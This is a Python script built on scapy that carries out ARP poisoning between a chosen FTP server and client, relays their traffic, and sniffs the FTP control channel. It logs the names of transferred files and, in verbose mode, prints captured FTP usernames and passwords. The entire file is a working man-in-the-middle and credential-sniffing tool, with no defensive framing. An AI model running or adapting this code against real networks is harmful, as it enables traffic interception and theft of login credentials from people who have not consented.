from functools import partial
import scapy.all as scapy
import ipaddress
import netifaces
import argparse
import signal
import re
import os

mac_cache = {}
detected_users = set()
detected_passwords = set()
detected_files = dict()

def get_cached_mac(ip, args):
    if ip not in mac_cache:
        mac_cache[ip] = get_mac(ip=ip, args=args)
    return mac_cache[ip]

def get_mac(ip, args):
        arp_request = scapy.ARP(op=1, pdst=ip)
        ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp_request
        response = scapy.srp(packet, iface=args.interf, timeout=2, verbose=args.v)[0]
        if response:
            return response[0][1].hwsrc
        else:
            raise Exception(f'Unable to resolve MAC address of IP {ip}')

def restore_tables(args):
    ftp_mac = get_cached_mac(args.IP_src, args)
    target_spoof = scapy.ARP(op=2, pdst=args.IP_target, psrc=args.IP_src, hwsrc=ftp_mac, hwdst=args.MAC_target)
    target_packet = scapy.Ether(dst=args.MAC_target) / target_spoof
    scapy.sendp(target_packet, iface=args.interf, verbose=False)
    print(f'\nRestored arp table for {args.IP_target}')

    server_spoof = scapy.ARP(op=2, pdst=args.IP_src, psrc=args.IP_target, hwsrc=args.MAC_target, hwdst=ftp_mac)
    server_packet = scapy.Ether(dst=ftp_mac) / server_spoof
    scapy.sendp(server_packet, iface=args.interf, verbose=False)
    print(f'\nRestored arp table for {args.IP_src}')

def spoof(args):
    target_spoof = scapy.ARP(op=2, pdst=args.IP_target, psrc=args.IP_src, hwsrc=args.MAC_src, hwdst=args.MAC_target)
    target_packet = scapy.Ether(dst=args.MAC_target) / target_spoof
    scapy.sendp(target_packet, iface=args.interf, verbose=False)
    print(f'\nSent spoofed reply to {args.IP_target}')

    ftp_mac = get_cached_mac(args.IP_src, args)
    server_spoof = scapy.ARP(op=2, pdst=args.IP_src, psrc=args.IP_target, hwsrc=args.MAC_src, hwdst=ftp_mac)
    server_packet = scapy.Ether(dst=ftp_mac) / server_spoof
    scapy.sendp(server_packet, iface=args.interf, verbose=False)
    print(f'\nSent spoofed reply to {args.IP_src}')

def relay_packets(pkt, args):
    if pkt.haslayer('IP'):
        if pkt['IP'].dst == args.IP_src:
            pkt['Ether'].dst = get_cached_mac(args.IP_src,args)
            scapy.sendp(pkt, iface=args.interf, verbose=False)
        elif pkt['IP'].dst == args.IP_target:
            pkt['Ether'].dst = get_cached_mac(args.IP_target, args)
            scapy.sendp(pkt, iface=args.interf, verbose=False)

def packet_callback(pkt, args):
    if pkt.haslayer('TCP') and pkt.haslayer('IP'):
        if pkt['TCP'].dport == 21 or pkt['TCP'].sport == 21:
            if hasattr(pkt, 'load'):
                payload = pkt.load.decode('utf-8', errors='ignore')
                if payload.startswith(('STOR','RETR')):
                    command, file_name = payload.split(' ', 1)
                    if file_name not in detected_files and file_name != [command]:
                        print(f"Transfer detected - File Name: {file_name.strip()}")
                        detected_files[file_name] = command

                if args.v == True:
                    if payload.startswith('USER'):
                        username = payload.split(' ', 1)[1]
                        if username not in detected_users:
                            print(f"FTP Login Attempt - Username: {username}")
                            detected_users.add(username)
                    elif payload.startswith('PASS'):
                        password = payload.split(' ', 1)[1]
                        if password not in detected_passwords:
                            print(f"FTP Login Attempt - Password: {password}")
                            detected_passwords.add(password)
        relay_packets(pkt, args)


def sniff_for_packets(args):

    def signal_handler(args, signum, frame):
        restore_tables(args)
        print ('\nStopping program.')
        exit (1)

    signal.signal(signal.SIGINT, partial(signal_handler, args))
    try:
        spoof(args)
        while True:
            scapy.sniff(
                iface=args.interf,
                prn=lambda pkt: packet_callback(pkt, args),
                store=False
            )
    except Exception as e:
        print(f'Exception caught: {e}')


def main():
    if os.geteuid() != 0:
        exit('You have to run the progam as sudo')
    parser = argparse.ArgumentParser(description='Arp poisoning and ftp network capture')
    parser.add_argument('IP_src', type=str, help='Requested IP address to capture')
    parser.add_argument('MAC_src', type=str, help='MAC address used for spoofing arp tables')
    parser.add_argument('IP_target', type=str, help='Requestor IP address')
    parser.add_argument('MAC_target', type=str, help='Requestor MAC address')
    parser.add_argument('interf', type=str, help='Interface to listen on')
    parser.add_argument('-v', action='store_true', default=False, help='Verbose mode')
    args = parser.parse_args()

    try:
        if not re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", args.MAC_src.lower()):
            raise Exception(f'{args.MAC_src} is an invalid mac address')
        if not re.match("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", args.MAC_target.lower()):
            raise Exception(f'{args.MAC_target} is an invalid mac address')
        s_ip = ipaddress.IPv4Address(args.IP_src)
        t_ip=ipaddress.IPv4Address(args.IP_target)
        if args.interf not in netifaces.interfaces():
            raise Exception(f'{args.interf} is not an available interface')
        sniff_for_packets(args)
    except Exception as e:
        parser.error(e)
    except KeyboardInterrupt as e:
        print(e)

    return (0)

if __name__=='__main__':
    main()
